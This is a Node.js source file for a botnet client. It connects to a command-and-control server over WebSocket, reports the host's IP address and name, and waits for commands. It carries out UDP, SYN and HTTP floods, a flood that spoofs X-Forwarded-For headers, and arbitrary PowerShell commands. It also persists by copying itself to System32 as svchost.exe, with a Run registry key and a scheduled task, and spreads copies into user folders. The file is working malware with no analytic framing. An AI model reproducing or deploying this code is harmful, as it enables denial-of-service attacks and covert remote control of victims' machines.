const WebSocket = require('ws');
const os = require('os');
const { exec } = require('child_process');
const fs = require('fs');
const path = require('path');
const dgram = require('dgram');
const net = require('net');
const http = require('http');

const C2_URL = 'host';

const ws = new WebSocket(C2_URL);

let active = true;

ws.on('open', () => {
    ws.send(`HELLO|${getIP()}|${os.hostname()}`);
    setTimeout(persist, 2000);
});

ws.on('message', msg => {
    const cmd = msg.toString();
    if (cmd.startsWith('ATTACK')) {
        const [,m,t,p,tim] = cmd.split('|');
        attack(m,t,+p,+tim);
    } else if (cmd==='STOP') active=false;
    else if (cmd.startsWith('BROADCAST')) console.log(`[BROADCAST] ${cmd.split('|')[1]}`);
    else if (cmd.startsWith('POWERSHELL')) exec(`powershell -Command "${cmd.split('|')[1]}"`);
    else if (cmd==='UPDATE') console.log(`[UPDATE] Received`);
    else if (cmd==='SPREAD') spread();
    else if (cmd==='PERSIST') persist();
});

function getIP() {
    const nets = os.networkInterfaces();
    for(const name in nets) for(const iface of nets[name]) if(!iface.internal&&iface.family==='IPv4') return iface.address;
    return 'unknown';
}

function attack(m,t,p,time) {
console.log(`[ATTACK] ${m} ${t}:${p} ${time}s`);
active=true;
const end=Date.now()+time*1000;
const run=()=>{if(!active||Date.now()>end)return;
if(m==='vip-udp')udpFlood(t,p);
if(m==='vip-syn')synFlood(t,p);
if(m==='vip-http2')httpFlood(t,p);
if(m==='bypass-custom')bypassAdvanced(t,p);
setImmediate(run);}
run();}

function udpFlood(t,p) {
const s=dgram.createSocket('udp4');
const buf=Buffer.alloc(1024);
s.send(buf,0,buf.length,p,t);
}

function synFlood(t,p) {
const s=net.connect(p,t); s.on('error',()=>{}); s.end();
}

function httpFlood(t,p) {
http.get(`http://${t}:${p}/`);
}

function bypassAdvanced(t,p) {
const opts={
hostname:t,port:p,path:'/',headers:{
'User-Agent':'Mozilla/5.0','X-Forwarded-For':`${Math.random()*255}.${Math.random()*255}.${Math.random()*255}.${Math.random()*255}`,
'Cookie':'session='+Math.random(),'Referer':`https://${t}/`
}};
const req=http.request(opts,res=>res.destroy());
req.on('error',()=>{});req.end();
}

function persist() {
const target=`C:\\Windows\\System32\\svchost.exe`;
if(!fs.existsSync(target)) fs.copyFileSync(process.argv[1],target);
exec(`reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v svchost /t REG_SZ /d "${target}" /f`);
exec(`schtasks /create /tn svchost /tr "${target}" /sc onlogon /rl highest /f`);
}

function spread() {
const drives=['C:\\Users\\Public','C:\\Users\\'+os.userInfo().username];
drives.forEach(d=>{const dest=path.join(d,'svchost.exe');
if(!fs.existsSync(dest))fs.copyFileSync(process.argv[1],dest);});
}
